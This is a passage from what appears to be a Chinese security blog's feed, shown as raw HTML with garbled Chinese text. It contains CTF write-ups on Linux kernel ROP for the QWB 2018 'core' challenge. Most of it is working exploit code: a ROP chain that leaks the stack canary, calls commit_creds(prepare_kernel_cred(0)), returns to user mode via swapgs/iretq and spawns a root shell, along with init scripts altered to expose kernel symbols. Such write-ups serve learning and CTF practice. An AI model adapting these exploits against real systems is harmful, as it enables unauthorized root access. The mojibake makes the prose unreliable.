class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)commit_creds;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">0x16</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š</p><ul><li><p>å°†pop_rcx_retåœ°å€å‹å…¥rdxï¼špop rcxï¼ˆadd rsp, 8ï¼‰åretå°±èƒ½ç»§ç»­æ‰§è¡Œä¹‹åçš„ropé“¾ï¼Œå·§å¦™( â€¢Ì€ Ï‰ â€¢Ì )âœ§</p></li><li><p>swapgs_restore_regs_and_return_to_usermode+0x16ï¼šå¦‚æœç›´æ¥ä»swapgs_restore_regs_and_return_to_usermode+0x36ï¼ˆmov rdi, cr3ï¼‰å¼€å§‹æ‰§è¡Œä¹‹åpop raxä¼šå› ä¸ºç”¨æˆ·æ€æ— æ³•è®¿é—®å†…æ ¸æ€æ ˆè€ŒæŠ¥é”™</p><p>+0x16åˆ°+0x36ä¹‹é—´çš„ä¸€ç³»åˆ—æ“ä½œç›¸å½“äºæŠŠæ ˆç§»åˆ°ç”¨æˆ·æ€å¯ä»¥è®¿é—®çš„å†…æ ¸ç©ºé—´å¹¶æŠŠæ ˆä¸Šçš„å†…å®¹ä¸€èµ·ç§»äº†è¿‡å»ï¼Œè¿™æ ·popçš„æ—¶å€™å°±ä¸ä¼šæŠ¥é”™äº†</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
      <tag>ret2usr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP basic</title>
    <link href="/2023/08/03/Kernel-ROP-basic/"/>
    <url>/2023/08/03/Kernel-ROP-basic/</url>
    
    <content type="html"><![CDATA[<p>Kernelï¼ä¸»è¦æ˜¯å¤ç°arttnba3å¤§ä½¬çš„åšå®¢*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚</p><p>psï¼šè¿™é“é¢˜æ˜¯åœ¨è€çˆ¹è¯·å®¢çš„é‚£å¤©åšçš„ï¼Œåšçš„æ—¶å€™ä¸æ–­çŠ¯ç—…ä¸”ç°åœ¨å†™åšå®¢çš„æ—¶å€™è®°å¿†å‡ ä¹ä¸ºé›¶ï¼Œæ‰€ä»¥é‡åšä¸€éå½“ä½œæ•´ç†å’Œå›å¿†ï¼ˆæœ€è¿‘è®°å¿†åŠ›çœŸçš„å¥½å·®ä¸çŸ¥é“ä¸ºä»€ä¹ˆ&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰</p><span id="more"></span><h1 id="Kernel-ROP-basic"><a href="#Kernel-ROP-basic" class="headerlink" title="Kernel ROP-basic"></a>Kernel ROP-basic</h1><p>æ•´ä¸ªææƒçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">çŠ¶æ€ä¿å­˜-&gt;æ‹¿rootæƒé™-&gt;è¿”å›ç”¨æˆ·æ€-&gt;æ‹¿shell<br></code></pre></td></tr></table></figure><h2 id="çŠ¶æ€ä¿å­˜"><a href="#çŠ¶æ€ä¿å­˜" class="headerlink" title="çŠ¶æ€ä¿å­˜"></a>çŠ¶æ€ä¿å­˜</h2><p>å…ˆäº†è§£ä¸€ä¸‹ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢è¿‡ç¨‹</p><h2 id="ç”¨æˆ·æ€â†’å†…æ ¸æ€"><a href="#ç”¨æˆ·æ€â†’å†…æ ¸æ€" class="headerlink" title="ç”¨æˆ·æ€â†’å†…æ ¸æ€"></a>ç”¨æˆ·æ€â†’å†…æ ¸æ€</h2><ul><li>åˆ‡æ¢GSæ®µå¯„å­˜å™¨ï¼šswapgsåˆ‡æ¢GSå¯„å­˜å™¨ï¼Œ</li><li>ä¿å­˜ç”¨æˆ·æ€æ ˆå¸§ä¿¡æ¯ï¼šè®°å½•rsp</li><li>ä¿å­˜ç”¨æˆ·æ€å¯„å­˜å™¨ä¿¡æ¯ï¼šé€šè¿‡ push ä¿å­˜å„å¯„å­˜å™¨å€¼åˆ°æ ˆä¸Šï¼Œä»¥ä¾¿åç»­â€œç€é™†â€å›ç”¨æˆ·æ€</li></ul><h3 id="å†…æ ¸æ€â†’ç”¨æˆ·æ€"><a href="#å†…æ ¸æ€â†’ç”¨æˆ·æ€" class="headerlink" title="å†…æ ¸æ€â†’ç”¨æˆ·æ€"></a>å†…æ ¸æ€â†’ç”¨æˆ·æ€</h3><p>æ¢å¤ç”¨æˆ·ç©ºé—´ä¿¡æ¯</p><ul><li><p>swapgsæŒ‡ä»¤æ¢å¤ç”¨æˆ·æ€GSå¯„å­˜å™¨</p></li><li><p>iretqæ¢å¤åˆ°ç”¨æˆ·ç©ºé—´ï¼Œiretqæ ˆå¸ƒå±€å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">|----------------------|<br>| RIP                  |&lt;== low mem<br>|----------------------|<br>| CS                   |<br>|----------------------|<br>| RFLAGS               |<br>|----------------------|<br>| RSP                  |<br>|----------------------|<br>| SS                   |&lt;== high mem<br>|----------------------|<br></code></pre></td></tr></table></figure></li></ul><p>æ‰€ä»¥éœ€è¦ä¿å­˜ä»¥ä¸‹å¯„å­˜å™¨çš„å€¼ï¼šeflagsï¼ˆçŠ¶æ€æ ‡å¿—å¯„å­˜å™¨ï¼‰ã€csï¼ˆä»£ç æ®µå¯„å­˜å™¨ï¼‰ã€rspå’Œssï¼ˆæ ˆæ®µå¯„å­˜å™¨ï¼‰</p><p>çŠ¶æ€ä¿å­˜å‡½æ•°ï¼ˆä½¿ç”¨å†…è”æ±‡ç¼–ï¼Œç¼–è¯‘æ—¶éœ€æŒ‡å®šå‚æ•°-masm&#x3D;intelï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span><span class="hljs-comment">//æ ‡å¿—è¿›æ ˆæŒ‡ä»¤ï¼Œå°†æ ‡å¿—å¯„å­˜å™¨çš„å€¼å‹å…¥å †æ ˆé¡¶éƒ¨</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ‹¿rootæƒé™"><a href="#æ‹¿rootæƒé™" class="headerlink" title="æ‹¿rootæƒé™"></a>æ‹¿rootæƒé™</h2><p>é€šè¿‡æ„é€ ROPé“¾æ‰§è¡Œå‡½æ•°commit_creds(prepare_kernel_cred(&amp;init_task))æˆ–commit_creds(&amp;init_cred)ï¼ˆè€ç‰ˆæœ¬commit_creds(prepare_kernel_cred(NULL))ï¼‰</p><h2 id="è¿”å›ç”¨æˆ·æ€ï¼Œæ‹¿shell"><a href="#è¿”å›ç”¨æˆ·æ€ï¼Œæ‹¿shell" class="headerlink" title="è¿”å›ç”¨æˆ·æ€ï¼Œæ‹¿shell"></a>è¿”å›ç”¨æˆ·æ€ï¼Œæ‹¿shell</h2><p>æ ¹æ®ğŸ‘†iretqæ ˆå¸ƒå±€ï¼ŒROPé“¾çš„æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">â†“   swapgs<br>    iretq<br>    user_shell_addr<span class="hljs-comment">//system(&quot;/bin/sh&quot;)åœ°å€</span><br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core</h2><h3 id="å¯åŠ¨åˆå§‹åŒ–è„šæœ¬åˆ†æ"><a href="#å¯åŠ¨åˆå§‹åŒ–è„šæœ¬åˆ†æ" class="headerlink" title="å¯åŠ¨åˆå§‹åŒ–è„šæœ¬åˆ†æ"></a>å¯åŠ¨åˆå§‹åŒ–è„šæœ¬åˆ†æ</h3><p>å…ˆçœ‹å¯åŠ¨è„šæœ¬ï¼Œstart.shï¼ˆæ›´æ”¹è¿‡çš„ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>--nographic \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ä¸èµ·æ¥çš„æ—¶å€™æ”¹ä¸€ä¸‹åˆ†é…çš„å†…å­˜</p><ul><li>å¼€å¯äº†KASLRä¿æŠ¤ï¼ˆåœ°å€éšæœºåŒ–ï¼‰</li></ul><p>æ‰“åŒ…è§£åŒ…ç›¸å…³å‘½ä»¤</p><ul><li><p>è§£åŒ…å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cpio -idmv &lt; core.cpio<br></code></pre></td></tr></table></figure></li><li><p>æ‰“åŒ…å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . | cpio -o --format=newc &gt; ../../core.cpio<br></code></pre></td></tr></table></figure></li></ul><p>æŸ¥çœ‹initæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><ul><li>kptr_restrict<ul><li>0ï¼šrootå’Œæ™®é€šç”¨æˆ·éƒ½å¯ä»¥è¯»å–å†…æ ¸ç¬¦å·åœ°å€ï¼ˆ&#x2F;proc&#x2F;kallsymsæ¥å£ï¼‰</li><li>1ï¼šrootç”¨æˆ·æœ‰æƒé™è¯»å–, æ™®é€šç”¨æˆ·æ²¡æœ‰æƒé™</li><li>2ï¼šå†…æ ¸å°†ç¬¦å·åœ°å€æ‰“å°ä¸ºå…¨0, rootå’Œæ™®é€šç”¨æˆ·éƒ½æ²¡æœ‰æƒé™</li></ul></li><li>ä½†å°†kptr_restrictç½®ä¸º0è¿˜æ˜¯ä¸èƒ½è¯»å–å†…æ ¸ç¬¦å·åœ°å€ï¼Œè¿˜éœ€è¦å°†perf_event_paranoidç½®0</li></ul><p>æ›´æ”¹åçš„initè„šæœ¬ï¼ˆéœ€è¦æŸ¥çœ‹å‡½æ•°åœ°å€ä»¥ä¾¿è¿›è¡Œè°ƒè¯•ï¼‰å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>echo 0 &gt; /proc/sys/kernel/kptr_restrict#æ›´æ”¹<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>echo 0 &gt; /proc/sys/kernel/perf_event_paranoid#å¢åŠ <br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><ul><li>å¼€å§‹æ—¶å†…æ ¸ç¬¦å·è¡¨è¢«å¤åˆ¶äº†ä¸€ä»½åˆ°&#x2F;tmp&#x2F;kalsymsä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è·å¾—å†…æ ¸ä¸­æ‰€æœ‰å‡½æ•°çš„åœ°å€</li><li>core.koå°±æ˜¯å­˜åœ¨æ¼æ´çš„å†…æ ¸æ¨¡å—</li><li>æ”¹å˜æƒé™å‰è®¾ç½®äº†å®šæ—¶å…³æœºpoweroff -d 120 -fï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥æŠŠæ—¶é—´æ”¹é•¿ï¼ˆæ³¨é‡Šæ‰ä¼šå¯åŠ¨ä¸äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>ç¼–è¯‘æŒ‡ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc ./exploit.c -o exploit -static -masm=intel<br></code></pre></td></tr></table></figure><p>åˆ†æè¿‡ç¨‹å°±ä¸å†™äº†ï¼Œå¤§ä½¬åšå®¢é‡Œéƒ½æœ‰ï¼Œåªè´´ä¸€ä¸ªexp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_privilige</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = (user_sp &amp; <span class="hljs-number">0xfffffffffffffff0</span>) + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span 